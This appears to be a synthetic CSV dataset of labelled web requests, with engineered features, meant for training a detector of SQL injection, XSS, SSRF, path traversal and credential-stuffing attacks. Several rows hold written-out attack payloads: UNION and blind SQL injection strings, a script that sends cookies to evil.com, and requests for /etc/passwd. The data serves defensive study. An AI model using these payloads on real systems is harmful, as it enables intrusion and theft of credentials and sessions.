timestamp,source_ip,destination_ip,protocol,http_method,url,request_headers,request_body,response_code,response_size,response_headers,user_agent,payload_raw,attack_type_label,hour,day_of_week,is_weekend,is_attack,parsed_request_headers,parsed_response_headers,Host,User-Agent,Accept,Content-Type,Server,url_length,url_num_params,url_num_special_chars,url_has_sql_keywords,url_has_xss_patterns,url_has_cmd_injection,url_has_traversal,url_has_ssrf_patterns,url_has_typosquatting,url_contains_ip,url_has_credential_patterns,payload_length,request_body_length,payload_special_chars,payload_num_sql_keywords,payload_num_xss_patterns,payload_has_encoding,payload_is_empty,payload_contains_hex,combined_payload,response_code_group,is_error_response,is_success_response,is_redirect_response,response_size_ratio,is_redirect,payload_length_safe,response_payload_ratio,source_ip_freq,source_ip_attack_ratio,is_known_attacker_ip,destination_ip_freq,destination_ip_attack_count,is_attack_tool_ua,ua_is_browser,ua_is_bot,ua_length,server_type,attack_pattern_sql,attack_pattern_xss,attack_pattern_cmd,attack_pattern_traversal,attack_pattern_ssrf,attack_pattern_typosquatting,attack_pattern_credential,special_chars_ratio,url_param_ratio,is_https,is_post_method,is_get_method,url_path_depth,url_has_sensitive_file,timestamp_min,requests_per_ip_per_minute,source_ip_error_ratio
2026-03-04 14:14:40,203.0.113.207,185.199.108.153,https,get,"/login?user=' union select username,password from users--","{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,404,6952,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,"' union select username,password from users--",sql_injection,14,2,0,1,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",104.18.24.12,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,Apache,57,1,5,1,0,0,0,0,0,0,0,45,0,1,2,0,0,0,0,"' union select username,password from users--",4xx,1,0,0,154.48888888888888,0,45,154.48888888888888,3,1.0,1,961,575,0,1,0,81,Apache,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.022222222222222223,0.017543859649122806,0,0,0,1,0,2026-03-04 14:14:00,1,0.6666666666666666
2026-03-21 10:58:26,172.16.0.235,52.45.123.89,http,post,/login,"{""Host"":""198.51.100.23"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",user=admin&pwd=123456,302,421,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,user=admin&pwd=123456,credential_stuffing_brute_force,10,5,1,1,"{'Host': '198.51.100.23', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",198.51.100.23,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,IIS,6,0,1,0,0,0,0,0,0,0,1,21,21,1,0,0,0,0,0,user=admin&pwd=123456user=admin&pwd=123456,3xx,0,0,1,20.047619047619047,1,42,10.023809523809524,14,0.7142857142857143,0,993,582,0,1,0,91,IIS,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.047619047619047616,0.0,0,0,0,1,0,2026-03-21 10:58:00,1,0.2857142857142857
2026-03-04 19:38:22,192.168.1.229,3.12.45.78,http,get,/.../about,"{""Host"":""104.18.24.12"",""User-Agent"":""curl/7.81.0"",""Accept"":""*/*""}",,200,1867,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",curl/7.81.0,,normal,19,2,0,0,"{'Host': '104.18.24.12', 'User-Agent': 'curl/7.81.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",104.18.24.12,curl/7.81.0,*/*,text/html,Cloudflare,10,0,5,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,0,,2xx,0,1,0,0.0,0,1,1867.0,10,0.3,0,951,546,0,0,1,11,Cloudflare,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0,0,0,2,0,2026-03-04 19:38:00,1,0.2
2026-03-14 10:27:30,10.0.0.228,172.67.128.45,http,get,/contact,"{""Host"":""192.168.1.1"",""User-Agent"":""Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",,302,3061,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15,,normal,10,5,1,0,"{'Host': '192.168.1.1', 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",192.168.1.1,Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15,*/*,text/html,nginx,8,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,,3xx,0,0,1,0.0,1,1,3061.0,11,0.36363636363636365,0,1020,627,0,0,0,75,nginx,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,1,0,2026-03-14 10:27:00,1,0.36363636363636365
2026-03-09 13:51:39,192.168.1.229,192.168.1.1,https,post,/login,"{""Host"":""3.12.45.78"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",username=root&password=admin,404,1429,"{""Content-Type"":""text/html"",""Server"":""IIS""}",XSStrike/3.1.5,username=root&password=admin,credential_stuffing_brute_force,13,0,0,1,"{'Host': '3.12.45.78', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",3.12.45.78,XSStrike/3.1.5,*/*,text/html,IIS,6,0,1,0,0,0,0,0,0,0,1,28,28,1,0,0,0,0,0,username=root&password=adminusername=root&password=admin,4xx,1,0,0,51.035714285714285,0,56,25.517857142857142,10,0.3,0,997,619,1,0,0,14,IIS,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.03571428571428571,0.0,0,0,0,1,0,2026-03-09 13:51:00,1,0.2
2026-03-20 13:51:28,172.16.0.104,172.67.128.45,http,get,"/user?username=' and updatexml(1,concat(0x7e,version()),1)--","{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,404,4022,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,"' and updatexml(1,concat(0x7e,version()),1)--",sql_injection,13,4,0,1,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",185.199.108.153,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,Apache,60,1,5,1,0,0,0,0,0,0,0,45,0,1,1,0,0,0,1,"' and updatexml(1,concat(0x7e,version()),1)--",4xx,1,0,0,89.37777777777778,0,45,89.37777777777778,10,0.8,0,1020,627,0,1,0,91,Apache,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.022222222222222223,0.016666666666666666,0,0,0,1,0,2026-03-20 13:51:00,1,0.5
2026-03-09 05:14:14,172.16.0.159,10.0.0.1,http,post,/images/logo.png,"{""Host"":""3.12.45.78"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",comment=Great article!,200,3023,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,,normal,5,0,0,0,"{'Host': '3.12.45.78', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",3.12.45.78,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,Apache,16,0,3,0,0,0,0,0,0,0,0,0,22,0,0,0,0,1,0,comment=Great article!,2xx,0,1,0,0.0,0,22,137.4090909090909,16,0.5625,0,998,578,0,1,0,81,Apache,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,2,0,2026-03-09 05:14:00,1,0.4375
2026-03-11 14:12:14,10.0.0.216,198.51.100.23,http,post,/blog,"{""Host"":""198.51.100.23"",""User-Agent"":""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"",""Accept"":""*/*""}",username=john_doe&password=pass123,200,3629,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,normal,14,2,0,0,"{'Host': '198.51.100.23', 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",198.51.100.23,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),*/*,text/html,nginx,5,0,1,0,0,0,0,0,0,0,1,0,34,0,0,0,0,1,0,username=john_doe&password=pass123,2xx,0,1,0,0.0,0,34,106.73529411764706,6,0.3333333333333333,0,1056,656,0,0,1,72,nginx,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0,0,0,1,0,2026-03-11 14:12:00,1,0.0
2026-03-09 07:43:27,192.168.1.29,52.45.123.89,https,get,/fetch?url=http://127.0.0.1:3306,"{""Host"":""3.12.45.78"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",,403,1000,"{""Content-Type"":""text/html"",""Server"":""nginx""}",XSStrike/3.1.5,http://127.0.0.1:3306,ssrf,7,0,0,1,"{'Host': '3.12.45.78', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",3.12.45.78,XSStrike/3.1.5,*/*,text/html,nginx,32,1,8,0,0,0,0,1,0,1,0,21,0,0,0,0,0,0,0,http://127.0.0.1:3306,4xx,1,0,0,47.61904761904762,0,21,47.61904761904762,4,1.0,1,993,582,1,0,0,14,nginx,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.03125,0,0,0,1,0,2026-03-09 07:43:00,1,0.75
2026-03-09 09:05:51,172.67.128.114,34.120.45.67,https,get,/./settings?page=2,"{""Host"":""203.0.113.45"",""User-Agent"":""curl/7.81.0"",""Accept"":""*/*""}",,200,4246,"{""Content-Type"":""text/html"",""Server"":""Apache""}",curl/7.81.0,,normal,9,0,0,0,"{'Host': '203.0.113.45', 'User-Agent': 'curl/7.81.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",203.0.113.45,curl/7.81.0,*/*,text/html,Apache,18,1,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,,2xx,0,1,0,0.0,0,1,4246.0,4,0.5,0,1010,589,0,0,1,11,Apache,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.05555555555555555,0,0,0,2,0,2026-03-09 09:05:00,1,0.5
2026-03-14 05:33:47,192.168.1.112,172.67.128.45,http,get,"/login?user=' and ascii(substring(database(),1,1))>100--","{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,404,5635,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,"' and ascii(substring(database(),1,1))>100--",sql_injection,5,5,1,1,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",185.199.108.153,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,nginx,56,1,5,1,0,0,0,0,0,0,0,44,0,2,0,0,0,0,0,"' and ascii(substring(database(),1,1))>100--",4xx,1,0,0,128.0681818181818,0,44,128.0681818181818,10,0.8,0,1020,627,0,1,0,81,nginx,0.5,0.0,0.0,0.0,0.0,0.0,0.0,0.045454545454545456,0.017857142857142856,0,0,0,1,1,2026-03-14 05:33:00,1,0.4
2026-03-03 10:31:01,185.199.108.64,198.51.100.23,http,get,/dashboard,"{""Host"":""34.120.45.67"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"",""Accept"":""*/*""}",,200,4909,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,,normal,10,1,0,0,"{'Host': '34.120.45.67', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",34.120.45.67,Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,*/*,text/html,Cloudflare,10,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,,2xx,0,1,0,0.0,0,1,4909.0,8,0.375,0,1056,656,0,1,0,66,Cloudflare,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,1,0,2026-03-03 10:31:00,1,0.125
2026-03-08 21:20:16,192.168.1.146,34.120.45.67,http,get,/products,"{""Host"":""192.168.1.1"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,200,3848,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,,normal,21,6,1,0,"{'Host': '192.168.1.1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",192.168.1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,Apache,9,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,,2xx,0,1,0,0.0,0,1,3848.0,11,0.5454545454545454,0,1010,589,0,1,0,91,Apache,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,1,0,2026-03-08 21:20:00,1,0.09090909090909091
2026-03-10 23:21:23,10.0.0.154,104.18.24.12,https,post,/comment,"{""Host"":""192.168.1.1"",""User-Agent"":""Nmap Scripting Engine"",""Accept"":""*/*""}",comment=%23%3Cscript%3Ealert%28document.domain%29%3C/script%3E,500,772,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Nmap Scripting Engine,#<script>alert(document.domain)</script>,xss,23,1,0,1,"{'Host': '192.168.1.1', 'User-Agent': 'Nmap Scripting Engine', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",192.168.1.1,Nmap Scripting Engine,*/*,text/html,nginx,8,0,1,0,0,0,0,0,0,0,0,40,62,4,0,2,0,0,0,#<script>alert(document.domain)</script>comment=%23%3Cscript%3Ealert%28document.domain%29%3C/script%3E,5xx,1,0,0,19.3,0,102,7.568627450980392,15,0.6666666666666666,0,986,617,1,0,0,21,nginx,0.0,0.5,0.0,0.0,0.0,0.0,0.0,0.1,0.0,0,0,0,1,0,2026-03-10 23:21:00,1,0.5333333333333333
2026-03-17 02:15:48,104.18.24.199,203.0.113.45,http,get,/download?file=../../../../etc/passwd%00.html,"{""Host"":""203.0.113.45"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",,200,7277,"{""Content-Type"":""text/html"",""Server"":""Apache""}",XSStrike/3.1.5,../../../../etc/passwd.html,directory_traversal,2,1,0,1,"{'Host': '203.0.113.45', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",203.0.113.45,XSStrike/3.1.5,*/*,text/html,Apache,45,1,17,0,0,0,1,0,0,0,0,27,0,0,0,0,0,0,0,../../../../etc/passwd.html,2xx,0,1,0,269.51851851851853,0,27,269.51851851851853,2,1.0,1,1028,611,1,0,0,14,Apache,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.022222222222222223,0,0,0,1,1,2026-03-17 02:15:00,1,0.5
2026-03-20 19:55:05,172.67.128.160,198.51.100.23,https,post,/login,"{""Host"":""192.168.1.1"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",user=admin&pwd=admin,401,7367,"{""Content-Type"":""text/html"",""Server"":""IIS""}",BurpSuite/2023.12,user=admin&pwd=admin,credential_stuffing_brute_force,19,4,0,1,"{'Host': '192.168.1.1', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",192.168.1.1,BurpSuite/2023.12,*/*,text/html,IIS,6,0,1,0,0,0,0,0,0,0,1,20,20,1,0,0,0,0,0,user=admin&pwd=adminuser=admin&pwd=admin,4xx,1,0,0,368.35,0,40,184.175,1,1.0,1,1056,656,1,0,0,17,IIS,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.05,0.0,0,0,0,1,0,2026-03-20 19:55:00,1,1.0
2026-03-08 06:03:38,192.168.1.54,172.67.128.45,http,post,/api/v1/products?sort=home,"{""Host"":""3.12.45.78"",""User-Agent"":""curl/7.81.0"",""Accept"":""*/*""}",comment=Great article!,200,3425,"{""Content-Type"":""text/html"",""Server"":""nginx""}",curl/7.81.0,,normal,6,6,1,0,"{'Host': '3.12.45.78', 'User-Agent': 'curl/7.81.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",3.12.45.78,curl/7.81.0,*/*,text/html,nginx,26,1,5,0,0,0,0,0,0,0,0,0,22,0,0,0,0,1,0,comment=Great article!,2xx,0,1,0,0.0,0,22,155.6818181818182,8,0.375,0,1020,627,0,0,1,11,nginx,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.038461538461538464,0,0,0,3,0,2026-03-08 06:03:00,1,0.125
2026-03-21 06:19:44,185.199.108.177,185.199.108.153,https,get,/login?category=2,"{""Host"":""10.0.0.1"",""User-Agent"":""wget/1.21.2"",""Accept"":""*/*""}",,301,3418,"{""Content-Type"":""text/html"",""Server"":""nginx""}",wget/1.21.2,,normal,6,5,1,0,"{'Host': '10.0.0.1', 'User-Agent': 'wget/1.21.2', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",10.0.0.1,wget/1.21.2,*/*,text/html,nginx,17,1,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,,3xx,0,0,1,0.0,1,1,3418.0,2,0.5,0,961,575,0,0,1,11,nginx,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.058823529411764705,0,0,0,1,0,2026-03-21 06:19:00,1,0.5
2026-03-13 02:38:00,10.0.0.159,172.67.128.45,https,post,/login,"{""Host"":""172.67.128.45"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",username=root&password=root,500,1838,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,username=root&password=root,credential_stuffing_brute_force,2,4,0,1,"{'Host': '172.67.128.45', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",172.67.128.45,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,nginx,6,0,1,0,0,0,0,0,0,0,1,27,27,1,0,0,0,0,0,username=root&password=rootusername=root&password=root,5xx,1,0,0,68.07407407407408,0,54,34.03703703703704,9,0.8888888888888888,0,1020,627,0,1,0,80,nginx,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.037037037037037035,0.0,0,0,0,1,0,2026-03-13 02:38:00,1,0.6666666666666666
2026-03-10 22:57:25,185.199.108.249,185.199.108.153,https,get,/dashboard?product=2,"{""Host"":""192.168.1.1"",""User-Agent"":""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"",""Accept"":""*/*""}",,200,2528,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,normal,22,1,0,0,"{'Host': '192.168.1.1', 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",192.168.1.1,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),*/*,text/html,Apache,20,1,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,,2xx,0,1,0,0.0,0,1,2528.0,3,0.3333333333333333,0,961,575,0,0,1,72,Apache,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.05,0,0,0,1,0,2026-03-10 22:57:00,1,0.3333333333333333
2026-03-17 04:54:51,192.168.1.61,172.67.128.45,http,get,/search?q=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>,"{""Host"":""192.168.1.1"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,403,911,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>,xss,4,1,0,1,"{'Host': '192.168.1.1', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",192.168.1.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,Apache,82,2,11,0,1,0,0,0,0,0,0,72,0,6,0,1,0,0,0,<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>,4xx,1,0,0,12.652777777777779,0,72,12.652777777777779,11,0.45454545454545453,0,1020,627,0,1,0,80,Apache,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.08333333333333333,0.024390243902439025,0,0,0,1,0,2026-03-17 04:54:00,1,0.36363636363636365
2026-03-19 01:54:23,10.0.0.165,52.45.123.89,https,get,/../services,"{""Host"":""10.0.0.1"",""User-Agent"":""Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15"",""Accept"":""*/*""}",,301,2238,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15,,normal,1,3,0,0,"{'Host': '10.0.0.1', 'User-Agent': 'Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",10.0.0.1,Mozilla/5.0 (iPad; CPU OS 16_0 like Mac OS X) AppleWebKit/605.1.15,*/*,text/html,Cloudflare,12,0,4,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,0,,3xx,0,0,1,0.0,1,1,2238.0,11,0.5454545454545454,0,993,582,0,0,0,66,Cloudflare,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0,0,0,2,0,2026-03-19 01:54:00,1,0.36363636363636365
2026-03-24 07:29:44,172.16.0.161,104.18.24.12,http,get,/fetch?url=file:///etc/passwd,"{""Host"":""3.12.45.78"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,200,5841,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,file:///etc/passwd,ssrf,7,1,0,1,"{'Host': '3.12.45.78', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",3.12.45.78,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,nginx,29,1,7,0,0,0,1,1,0,0,0,18,0,0,0,0,0,0,0,file:///etc/passwd,2xx,0,1,0,324.5,0,18,324.5,8,0.625,0,986,617,0,1,0,81,nginx,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.034482758620689655,0,0,0,1,1,2026-03-24 07:29:00,1,0.25
2026-03-05 17:09:21,198.51.100.17,172.67.128.45,https,post,/css/style.css,"{""Host"":""185.199.108.153"",""User-Agent"":""python-requests/2.28.0"",""Accept"":""*/*""}",comment=Great article!,200,1993,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",python-requests/2.28.0,,normal,17,3,0,0,"{'Host': '185.199.108.153', 'User-Agent': 'python-requests/2.28.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",185.199.108.153,python-requests/2.28.0,*/*,text/html,Cloudflare,14,0,3,0,0,0,0,0,0,0,0,0,22,0,0,0,0,1,0,comment=Great article!,2xx,0,1,0,0.0,0,22,90.5909090909091,3,0.3333333333333333,0,1020,627,0,0,1,22,Cloudflare,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0,2,0,2026-03-05 17:09:00,1,0.0
